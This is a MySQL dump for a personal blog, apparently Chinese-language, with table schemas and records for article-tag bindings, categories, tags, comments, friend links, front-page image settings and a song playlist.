INSERT INTO `article_bind_article_tag` VALUES (427, 3, 42);
INSERT INTO `article_bind_article_tag` VALUES (428, 5, 42);
INSERT INTO `article_bind_article_tag` VALUES (437, 5, 64);
INSERT INTO `article_bind_article_tag` VALUES (438, 14, 64);
INSERT INTO `article_bind_article_tag` VALUES (452, 18, 66);
INSERT INTO `article_bind_article_tag` VALUES (454, 14, 21);
INSERT INTO `article_bind_article_tag` VALUES (455, 18, 65);
INSERT INTO `article_bind_article_tag` VALUES (461, 18, 62);
INSERT INTO `article_bind_article_tag` VALUES (462, 14, 62);
INSERT INTO `article_bind_article_tag` VALUES (463, 18, 61);
INSERT INTO `article_bind_article_tag` VALUES (464, 14, 61);
INSERT INTO `article_bind_article_tag` VALUES (465, 18, 60);
INSERT INTO `article_bind_article_tag` VALUES (466, 3, 60);
INSERT INTO `article_bind_article_tag` VALUES (467, 16, 59);
INSERT INTO `article_bind_article_tag` VALUES (468, 13, 59);
INSERT INTO `article_bind_article_tag` VALUES (469, 16, 58);
INSERT INTO `article_bind_article_tag` VALUES (470, 13, 58);
INSERT INTO `article_bind_article_tag` VALUES (471, 3, 55);
INSERT INTO `article_bind_article_tag` VALUES (472, 14, 55);
INSERT INTO `article_bind_article_tag` VALUES (473, 16, 54);
INSERT INTO `article_bind_article_tag` VALUES (474, 16, 53);
INSERT INTO `article_bind_article_tag` VALUES (475, 16, 51);
INSERT INTO `article_bind_article_tag` VALUES (476, 3, 51);
INSERT INTO `article_bind_article_tag` VALUES (477, 14, 51);
INSERT INTO `article_bind_article_tag` VALUES (478, 18, 67);
INSERT INTO `article_bind_article_tag` VALUES (479, 14, 47);
INSERT INTO `article_bind_article_tag` VALUES (491, 5, 68);
INSERT INTO `article_bind_article_tag` VALUES (497, 10, 69);
INSERT INTO `article_bind_article_tag` VALUES (513, 19, 70);
INSERT INTO `article_bind_article_tag` VALUES (556, 3, 72);
INSERT INTO `article_bind_article_tag` VALUES (557, 1, 71);
INSERT INTO `article_bind_article_tag` VALUES (558, 3, 71);
INSERT INTO `article_bind_article_tag` VALUES (564, 3, 73);
INSERT INTO `article_bind_article_tag` VALUES (579, 1, 74);
INSERT INTO `article_bind_article_tag` VALUES (580, 3, 74);
INSERT INTO `article_bind_article_tag` VALUES (617, 1, 75);
INSERT INTO `article_bind_article_tag` VALUES (618, 11, 75);
INSERT INTO `article_bind_article_tag` VALUES (631, 1, 76);
INSERT INTO `article_bind_article_tag` VALUES (632, 11, 76);
INSERT INTO `article_bind_article_tag` VALUES (638, 3, 18);
INSERT INTO `article_bind_article_tag` VALUES (639, 8, 18);
INSERT INTO `article_bind_article_tag` VALUES (666, 10, 78);
INSERT INTO `article_bind_article_tag` VALUES (667, 11, 78);
INSERT INTO `article_bind_article_tag` VALUES (670, 10, 10);
INSERT INTO `article_bind_article_tag` VALUES (696, 21, 77);
INSERT INTO `article_bind_article_tag` VALUES (697, 10, 77);
INSERT INTO `article_bind_article_tag` VALUES (707, 21, 79);
INSERT INTO `article_bind_article_tag` VALUES (732, 21, 81);
INSERT INTO `article_bind_article_tag` VALUES (752, 10, 8);
INSERT INTO `article_bind_article_tag` VALUES (753, 11, 8);
INSERT INTO `article_bind_article_tag` VALUES (775, 21, 82);
INSERT INTO `article_bind_article_tag` VALUES (798, 21, 85);
INSERT INTO `article_bind_article_tag` VALUES (803, 21, 84);
INSERT INTO `article_bind_article_tag` VALUES (820, 21, 83);
INSERT INTO `article_bind_article_tag` VALUES (823, 21, 86);
INSERT INTO `article_bind_article_tag` VALUES (851, 7, 87);
INSERT INTO `article_bind_article_tag` VALUES (872, 10, 24);
INSERT INTO `article_bind_article_tag` VALUES (873, 15, 24);
INSERT INTO `article_bind_article_tag` VALUES (891, 15, 90);
INSERT INTO `article_bind_article_tag` VALUES (893, 1, 22);
INSERT INTO `article_bind_article_tag` VALUES (894, 10, 22);
INSERT INTO `article_bind_article_tag` VALUES (903, 10, 23);
INSERT INTO `article_bind_article_tag` VALUES (904, 15, 23);
INSERT INTO `article_bind_article_tag` VALUES (905, 1, 88);
INSERT INTO `article_bind_article_tag` VALUES (906, 15, 88);
INSERT INTO `article_bind_article_tag` VALUES (907, 15, 89);
INSERT INTO `article_bind_article_tag` VALUES (929, 22, 91);
INSERT INTO `article_bind_article_tag` VALUES (930, 22, 92);
INSERT INTO `article_bind_article_tag` VALUES (932, 22, 94);
INSERT INTO `article_bind_article_tag` VALUES (935, 22, 95);
INSERT INTO `article_bind_article_tag` VALUES (938, 22, 96);
INSERT INTO `article_bind_article_tag` VALUES (947, 22, 97);
INSERT INTO `article_bind_article_tag` VALUES (950, 22, 98);
INSERT INTO `article_bind_article_tag` VALUES (953, 22, 99);
INSERT INTO `article_bind_article_tag` VALUES (955, 22, 93);
INSERT INTO `article_bind_article_tag` VALUES (959, 22, 100);
INSERT INTO `article_bind_article_tag` VALUES (961, 22, 101);
INSERT INTO `article_bind_article_tag` VALUES (967, 22, 102);
INSERT INTO `article_bind_article_tag` VALUES (974, 22, 103);
INSERT INTO `article_bind_article_tag` VALUES (987, 22, 104);
INSERT INTO `article_bind_article_tag` VALUES (1020, 1, 105);
INSERT INTO `article_bind_article_tag` VALUES (1044, 1, 106);
INSERT INTO `article_bind_article_tag` VALUES (1057, 1, 108);
INSERT INTO `article_bind_article_tag` VALUES (1090, 1, 109);
INSERT INTO `article_bind_article_tag` VALUES (1091, 15, 109);
INSERT INTO `article_bind_article_tag` VALUES (1105, 1, 110);
INSERT INTO `article_bind_article_tag` VALUES (1240, 1, 117);
INSERT INTO `article_bind_article_tag` VALUES (1241, 1, 116);
INSERT INTO `article_bind_article_tag` VALUES (1242, 1, 115);
INSERT INTO `article_bind_article_tag` VALUES (1243, 1, 114);
INSERT INTO `article_bind_article_tag` VALUES (1244, 1, 113);
INSERT INTO `article_bind_article_tag` VALUES (1245, 1, 112);
INSERT INTO `article_bind_article_tag` VALUES (1246, 1, 111);
INSERT INTO `article_bind_article_tag` VALUES (1247, 1, 9);
INSERT INTO `article_bind_article_tag` VALUES (1248, 10, 9);
INSERT INTO `article_bind_article_tag` VALUES (1249, 1, 107);
INSERT INTO `article_bind_article_tag` VALUES (1262, 1, 26);
INSERT INTO `article_bind_article_tag` VALUES (1263, 10, 26);
INSERT INTO `article_bind_article_tag` VALUES (1264, 15, 26);
INSERT INTO `article_bind_article_tag` VALUES (1265, 21, 80);
INSERT INTO `article_bind_article_tag` VALUES (1280, 1, 118);
INSERT INTO `article_bind_article_tag` VALUES (1281, 15, 118);
INSERT INTO `article_bind_article_tag` VALUES (1318, 1, 119);
INSERT INTO `article_bind_article_tag` VALUES (1319, 15, 119);
INSERT INTO `article_bind_article_tag` VALUES (1336, 1, 120);
INSERT INTO `article_bind_article_tag` VALUES (1337, 15, 120);
INSERT INTO `article_bind_article_tag` VALUES (1392, 1, 121);
INSERT INTO `article_bind_article_tag` VALUES (1393, 15, 121);
INSERT INTO `article_bind_article_tag` VALUES (1407, 1, 122);
INSERT INTO `article_bind_article_tag` VALUES (1413, 6, 1);
INSERT INTO `article_bind_article_tag` VALUES (1414, 6, 16);

-- ----------------------------
-- Table structure for article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_category`;
CREATE TABLE `article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '分类主键id',
  `name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类的名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类的描述',
  `article_sum` int(0) NOT NULL DEFAULT 0 COMMENT '该分类的文章数量,由消息队列更新',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '分类的评论数量,由定时任务进行更新',
  `parent_categoray_id` int(0) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '分类的数据表,描述分类的信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_category
-- ----------------------------
INSERT INTO `article_category` VALUES (1, '随笔手记', '随笔手记', 22, 0, 0);
INSERT INTO `article_category` VALUES (2, '学习笔记', '学习笔记', 14, 0, 0);
INSERT INTO `article_category` VALUES (3, '短代码', '短代码', 5, 0, 0);
INSERT INTO `article_category` VALUES (4, '个人闲谈', '个人闲谈', 3, 0, 0);
INSERT INTO `article_category` VALUES (5, '后端开发', '后端开发', 0, 0, 2);
INSERT INTO `article_category` VALUES (6, '前端开发', '前端开发', 0, 0, 2);
INSERT INTO `article_category` VALUES (7, '底层开发', '底层开发', 0, 0, 2);
INSERT INTO `article_category` VALUES (8, '运维技术', '运维技术', 0, 0, 2);
INSERT INTO `article_category` VALUES (9, '移动开发', '移动开发', 0, 0, 2);

-- ----------------------------
-- Table structure for article_tag
-- ----------------------------
DROP TABLE IF EXISTS `article_tag`;
CREATE TABLE `article_tag`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章标签的名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章标签的描述',
  `article_sum` int(0) NOT NULL COMMENT '文章标签的文章数量',
  `comment_sum` int(0) NOT NULL COMMENT '文章标签的评论数量',
  `weight` int(0) NOT NULL COMMENT '文章标签的排序权重',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 23 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '文章标签表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_tag
-- ----------------------------
INSERT INTO `article_tag` VALUES (1, 'Java', 'Java', 0, 0, 0);
INSERT INTO `article_tag` VALUES (2, 'JavaScript', 'JavaScript', 0, 0, 0);
INSERT INTO `article_tag` VALUES (3, '分布式', '分布式', 0, 0, 0);
INSERT INTO `article_tag` VALUES (4, '网络安全', '网络安全', 0, 0, 0);
INSERT INTO `article_tag` VALUES (5, 'Nginx', 'Nginx', 0, 0, 0);
INSERT INTO `article_tag` VALUES (6, '生活杂谈', '生活杂谈', 0, 0, 0);
INSERT INTO `article_tag` VALUES (7, '工具使用', '工具使用', 0, 0, 0);
INSERT INTO `article_tag` VALUES (8, 'Spring', 'Spring', 0, 0, 0);
INSERT INTO `article_tag` VALUES (9, '设计模式', '设计模式', 0, 0, 0);
INSERT INTO `article_tag` VALUES (10, '常见概念', '常见概念', 0, 0, 0);
INSERT INTO `article_tag` VALUES (11, 'NIO', 'NIO', 0, 0, 0);
INSERT INTO `article_tag` VALUES (12, 'Kotlin', 'Kotlin', 0, 0, 0);
INSERT INTO `article_tag` VALUES (13, 'Mysql', 'Mysql', 0, 0, 0);
INSERT INTO `article_tag` VALUES (14, '服务安装', '服务安装', 0, 0, 0);
INSERT INTO `article_tag` VALUES (15, '并发编程', '并发编程', 0, 0, 0);
INSERT INTO `article_tag` VALUES (16, '常见框架', '常见框架', 0, 0, 0);
INSERT INTO `article_tag` VALUES (17, '第三方服务', '第三方服务', 0, 0, 0);
INSERT INTO `article_tag` VALUES (18, '集群搭建', '集群搭建', 0, 0, 0);
INSERT INTO `article_tag` VALUES (19, 'C', 'C', 0, 0, 0);
INSERT INTO `article_tag` VALUES (20, 'C++', 'C++', 0, 0, 0);
INSERT INTO `article_tag` VALUES (21, 'Netty', 'Netty', 0, 0, 0);
INSERT INTO `article_tag` VALUES (22, '多线程设计模式', '多线程设计模式', 0, 0, 0);

-- ----------------------------
-- Table structure for article_tag_bind_article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_tag_bind_article_category`;
CREATE TABLE `article_tag_bind_article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `article_category_id` int(0) NOT NULL COMMENT '文章分类的id',
  `article_tag_id` int(0) NOT NULL COMMENT '文章标签的id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '评论主键id',
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论的内容,直接存放的文本,后续可以使用markdown',
  `user_id` int(0) NOT NULL COMMENT '评论用户id',
  `article_id` int(0) NOT NULL COMMENT '评论文章id',
  `parent_id` int(0) NOT NULL DEFAULT 0 COMMENT '父评论id,是否评论嵌套,评论哪个评论',
  `root_id` int(0) NOT NULL DEFAULT 0 COMMENT '根评论id,评论嵌套情况下',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建评论的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新的评论时间',
  `approval` int(0) NOT NULL DEFAULT 0 COMMENT '评论的赞数',
  `oppose` int(0) NOT NULL DEFAULT 0 COMMENT '评论的踩数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '评论的数据表,添加parent_id和root_id字段使其支持评论嵌套' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of comment
-- ----------------------------

-- ----------------------------
-- Table structure for friend
-- ----------------------------
DROP TABLE IF EXISTS `friend`;
CREATE TABLE `friend`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '友链主键id',
  `nickname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '昵称',
  `website` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '网站',
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '头像',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '权重',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '添加时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of friend
-- ----------------------------

-- ----------------------------
-- Table structure for front_img_config
-- ----------------------------
DROP TABLE IF EXISTS `front_img_config`;
CREATE TABLE `front_img_config`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '前台图片配置主键id',
  `belong` int(0) NOT NULL DEFAULT 0 COMMENT '属于的位置:1.分类页面,2.搜索页面,3,文章页面,4.用户页面,5.登录页面,6.个人logo,7.轮播页面',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '类型的描述',
  `img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '图片的地址',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '前台页面配置表，方便更换背景图片等信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of front_img_config
-- ----------------------------
INSERT INTO `front_img_config` VALUES (1, 1, '分类', 'http://blog.img.tuwq.cn/upload/config/img/8a19c94133bf1273cfd18f1da736626f.jpg?v=1533793520500', '2018-08-08 16:13:12', '2018-08-09 05:45:21');
INSERT INTO `front_img_config` VALUES (2, 2, '搜索', 'http://blog.img.tuwq.cn/upload/config/img/search.jpg?v=1533734944107', '2018-08-08 16:13:22', '2018-08-08 13:29:04');
INSERT INTO `front_img_config` VALUES (3, 3, '文章', 'http://blog.img.tuwq.cn/upload/config/img/bg6.jpg?v=1533792081254', '2018-08-08 16:13:45', '2018-08-09 05:21:21');
INSERT INTO `front_img_config` VALUES (4, 4, '用户', 'http://blog.img.tuwq.cn/upload/config/img/s1.jpg?v=1533792086156', '2018-08-08 16:14:05', '2018-08-09 05:21:26');
INSERT INTO `front_img_config` VALUES (5, 5, '登录', 'http://blog.img.tuwq.cn/upload/config/img/login.jpg?v=1533734270104', '2018-08-08 17:15:58', '2018-08-08 13:17:50');
INSERT INTO `front_img_config` VALUES (6, 6, '个人logo', 'http://blog.img.tuwq.cn/upload/config/img/logo-transparent.png?v=1550760644501', '2018-08-08 18:15:24', '2018-11-15 15:39:45');
INSERT INTO `front_img_config` VALUES (7, 7, '轮播图1', 'http://blog.img.tuwq.cn/upload/config/img/98500b4b6c1a8a6738b4f2bf836a29c7.jpg?v=1533793915422', '2018-08-08 16:16:31', '2018-08-09 05:51:55');
INSERT INTO `front_img_config` VALUES (8, 7, '轮播图2', 'http://blog.img.tuwq.cn/upload/config/img/a693a08ebae745a8726b3dac591830e2.jpg?v=1533793959353', '2018-08-08 16:19:01', '2018-08-09 05:52:39');
INSERT INTO `front_img_config` VALUES (9, 7, '轮播图3', 'http://blog.img.tuwq.cn/upload/config/img/e89e63c82505b9b9316db45b961860b8.jpg?v=1533793831849', '2018-08-08 16:27:13', '2018-08-09 05:50:32');
INSERT INTO `front_img_config` VALUES (10, 8, '主背景', 'http://blog.img.tuwq.cn/upload/config/img/3D5801BEE028B5E138596C10B104200D.jpg?v=1550759101218', '2019-02-21 23:42:26', '2019-02-21 23:42:26');

-- ----------------------------
-- Table structure for song
-- ----------------------------
DROP TABLE IF EXISTS `song`;
CREATE TABLE `song`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '歌曲主键',
  `song_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌名',
  `singer` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌手',
  `lyric` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '歌词',
  `cover` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌曲封面',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌曲地址',
  `load_sum` int(0) NOT NULL DEFAULT 0 COMMENT '下载数量',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '喜欢数',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '权重',
  `duration` double(11, 0) NOT NULL DEFAULT 0 COMMENT '播放时间长度',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 164 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song
-- ----------------------------
INSERT INTO `song` VALUES (4, 'なんでもないや 没什么大不了的（Cover：Radwimps）', 'Akie秋绘', '', 'FBE2BFB0EF19E43F34C280B6ACFC9BFA_179358614111.jpg', 'FBE2BFB0EF19E43F34C280B6ACFC9BFA_Akie秋绘 - なんでもないや 没什么大不了的（Cover：Radwimps）.mp3', 0, 0, 0, 347, '2018-08-24 11:17:50', '2018-08-24 11:17:50');
INSERT INTO `song` VALUES (5, '前前前世 (movie ver.),动画电影《你的名字。》主题曲,', 'RADWIMPS', '', '7AF750DB6D06820AD12EA8602298793A_764910471.jpg', '7AF750DB6D06820AD12EA8602298793A_RADWIMPS - 前前前世 (movie ver.).mp3', 0, 0, 0, 286, '2018-08-24 11:21:14', '2018-08-24 11:21:14');
INSERT INTO `song` VALUES (6, '深海少女', 'のぶなが', '', 'DBED9F237AFB8B81EC188785D0400F1D_-1665673591.jpg', 'DBED9F237AFB8B81EC188785D0400F1D_のぶなが - 深海少女.mp3', 0, 0, 0, 217, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song` VALUES (7, '夏恋', 'Otokaze', '', 'A7728690B1D88CCDC579D6A0ED0EA058_-930949409.jpg', 'A7728690B1D88CCDC579D6A0ED0EA058_Otokaze - 夏恋.mp3', 0, 0, 0, 266, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song` VALUES (8, 'MEGALOBOX', 'Mabanua', '', '999F7AA28DA05FA6EBFB777FB4EAD63B_1008361907.jpg', '999F7AA28DA05FA6EBFB777FB4EAD63B_Mabanua - MEGALOBOX.mp3', 0, 0, 0, 126, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song` VALUES (9, '雨き声残響', 'ゆめこ', '', 'E97DF72F5E43512BB1738D82C6E971F2_2112942494.jpg', 'E97DF72F5E43512BB1738D82C6E971F2_ゆめこ - 雨き声残響.mp3', 0, 0, 0, 173, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
INSERT INTO `song` VALUES (12, 'True Strength - Epic Music', 'John Dreamer', '', '64E5EEA66702422F948B5F219545B5B0_505789075.jpg', '64E5EEA66702422F948B5F219545B5B0_John Dreamer - True Strength - Epic Music.mp3', 0, 0, 0, 205, '2018-08-24 11:35:52', '2018-08-24 11:35:52');
INSERT INTO `song` VALUES (13, 'Weekend', 'Dirk Reichardt', '', '3D9FFF22B10755807B5CB0CD09E7EC1D_1467686087.jpg', '3D9FFF22B10755807B5CB0CD09E7EC1D_Dirk Reichardt - Weekend.mp3', 0, 0, 0, 175, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song` VALUES (14, 'Going Out', '久石譲', '', 'F3B8886B9A5F7FE70A3D58D19BBF21C2_-932109981.jpg', 'F3B8886B9A5F7FE70A3D58D19BBF21C2_久石譲 - Going Out.mp3', 0, 0, 0, 78, '2018-08-24 11:38:51', '2018-08-24 11:38:51');
INSERT INTO `song` VALUES (15, 'Home - String Quartet Tribute to Edward Sharpe and the Magnetic Zeros', 'Vitamin String Quartet', '', '34D2D0D347611128598B3EF5498ACE0A_408084692.jpg', '34D2D0D347611128598B3EF5498ACE0A_Vitamin String Quartet - Home - String Quartet Tribute to Edward Sharpe and the Magnetic Zeros.mp3', 0, 0, 0, 272, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song` VALUES (16, 'Helmet to Helmet', 'Brand X Music', '', '5FB8A8F842C90F980B001203125A0A6E_1913245176.jpg', '5FB8A8F842C90F980B001203125A0A6E_Brand X Music - Helmet to Helmet.mp3', 0, 0, 0, 163, '2018-08-24 11:41:53', '2018-08-24 11:41:53');
INSERT INTO `song` VALUES (17, 'Main Title《冰与火之歌：权力的游戏》配乐', 'Ramin Djawadi', '', '79B34B5F8B1711069AD6A7C7C174355D_495037258.jpg', '79B34B5F8B1711069AD6A7C7C174355D_Ramin Djawadi - Main Title.mp3', 0, 0, 0, 106, '2018-08-24 11:43:34', '2018-08-24 11:43:34');
INSERT INTO `song` VALUES (18, 'See You Again《速度与激情7》致敬保罗沃克插曲', 'Wiz Khalifa', '', '5BCC69EB85D66CD8AB582541D41191F9_512712013.jpg', '5BCC69EB85D66CD8AB582541D41191F9_Wiz Khalifa,Charlie Puth - See You Again.mp3', 0, 0, 0, 231, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song` VALUES (19, 'He\'s a Pirate (From \"Pirates of the Caribbean)', 'Taylor Davis', '', '6DE17F25FFA47EA67903365459E22CB5_-230675359.jpg', '6DE17F25FFA47EA67903365459E22CB5_Taylor Davis - He\'s a Pirate (From ＂Pirates of the Caribbean＂).mp3', 0, 0, 0, 158, '2018-08-24 11:49:47', '2018-08-24 11:49:47');
INSERT INTO `song` VALUES (20, 'Here With You', 'Asher Book', '', 'D8E5FE51344878B33A6576E3DDE4A182_1671520274.jpg', 'D8E5FE51344878B33A6576E3DDE4A182_Asher Book - Here With You.mp3', 0, 0, 0, 226, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song` VALUES (21, 'BLISS <寄生獣 セイの>', 'Ken Arai', '', 'F0F0D4A26FC527B67B81084C2FE58516_1926094732.jpg', 'F0F0D4A26FC527B67B81084C2FE58516_Ken Arai - BLISS.mp3', 0, 0, 0, 224, '2018-08-24 11:53:55', '2018-08-24 11:53:55');
INSERT INTO `song` VALUES (22, 'At The Edge', '千坂', '', 'AF739FB987154371E511E5B6A8FD99EA_-440538018.jpg', 'AF739FB987154371E511E5B6A8FD99EA_千坂 - At The Edge.mp3', 0, 0, 0, 201, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song` VALUES (23, '没什么大不了（なんでもないや）（女声翻唱remix）', 'Maxone / 夏璃夜', '', '6BD0BA42439004DBA709B9C38256DD59_1749049144.jpg', '6BD0BA42439004DBA709B9C38256DD59_Maxone,夏璃夜 - 没什么大不了（なんでもないや）（女声翻唱remix）.mp3', 0, 0, 0, 208, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song` VALUES (24, 'Monster', 'Vitamin String', '', '905FA17FFF9677372B02C80512A93C33_1446065005.jpg', '905FA17FFF9677372B02C80512A93C33_Vitamin String Quartet - Monster.mp3', 0, 0, 0, 194, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song` VALUES (25, 'ONE', 'Aimer', '', '7DD30AD1B4430C09AE41365F215CBA05_-1856783029.jpg', '7DD30AD1B4430C09AE41365F215CBA05_Aimer - ONE.mp3', 0, 0, 0, 332, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song` VALUES (26, 'Secrets', 'Simply Three', '', 'BA70F745C08C3F9E9A74DF890F30CB79_-1967669384.jpg', 'BA70F745C08C3F9E9A74DF890F30CB79_Simply Three - Secrets.mp3', 0, 0, 0, 199, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song` VALUES (27, 'Viva La Vida ', 'Vitamin String Quartet', '', '47AFE3A59D12500270E8348640412F34_-2426296.jpg', '47AFE3A59D12500270E8348640412F34_Vitamin String Quartet - Viva La Vida.mp3', 0, 0, 0, 240, '2018-08-24 12:05:37', '2018-08-24 12:05:37');
INSERT INTO `song` VALUES (28, 'Everything', 'Yinyues', '', '486E8D9E808973AEC4F767949DAB79A4_-2086600378.jpg', '486E8D9E808973AEC4F767949DAB79A4_Yinyues - Everything.mp3', 0, 0, 0, 256, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song` VALUES (29, 'Pirates Of The Caribbean (He\'s A Pirate)《加勒比海盗》', 'Maksim Mrvica', '', '3F8DD958CCF175673954746BA2E683B7_1072319029.jpg', '3F8DD958CCF175673954746BA2E683B7_Maksim Mrvica - Pirates Of The Caribbean (He\'s A Pirate).mp3', 0, 0, 0, 262, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song` VALUES (30, 'Look At Me Now', 'Charlie Puth', '', 'D91AB12527E21BEEFA9DD34FE78B90FC_-1538660113.jpg', 'D91AB12527E21BEEFA9DD34FE78B90FC_Charlie Puth - Look At Me Now.mp3', 0, 0, 0, 198, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song` VALUES (31, '動く、動く', '動く、動く   TV动画《少女终末旅行》片头曲水瀬いのり / 久', '', '07FA78CDB0EF540754CA520E4A53F48C_1136275134.jpg', '07FA78CDB0EF540754CA520E4A53F48C_水瀬いのり,久保ユリカ - 動く、動く.mp3', 0, 0, 0, 277, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song` VALUES (32, 'The Parting Glass', '游戏《刺客信条4：黑旗》结尾曲Assassin\'s Creed Italia', '', '639DA57ACC752E55AE4C27F7921A7610_-2117025252.jpg', '639DA57ACC752E55AE4C27F7921A7610_Assassin\'s Creed Italia - The Parting Glass.mp3', 0, 0, 0, 137, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song` VALUES (33, '優しさの理由  TV动画《冰果》OP1 / TVアニメ「氷菓」OPテーマ', 'ChouCho', '', '7ABC000F2462E51124E67AF6AB5AEFD4_-419535905.jpg', '7ABC000F2462E51124E67AF6AB5AEFD4_ChouCho - 優しさの理由.mp3', 0, 0, 0, 254, '2018-08-24 12:19:33', '2018-08-24 12:19:33');
INSERT INTO `song` VALUES (34, 'DaisyTV动画《境界的彼方》片尾曲 / TVアニメ「境界の彼方」EDテーマ', 'STEREO DIVE FOUNDATION', '', 'A4E16F369B4F5EE23CD5D204D7CC2791_-765359096.jpg', 'A4E16F369B4F5EE23CD5D204D7CC2791_STEREO DIVE FOUNDATION - Daisy.mp3', 0, 0, 0, 276, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song` VALUES (35, 'Faded', 'Robert Mendoza', '', 'DA4A1F94221CC7DBCFDACC33E1F9C7E1_-2088577637.jpg', 'DA4A1F94221CC7DBCFDACC33E1F9C7E1_Robert Mendoza - Faded.mp3', 0, 0, 0, 215, '2018-08-24 12:26:38', '2018-08-24 12:26:38');
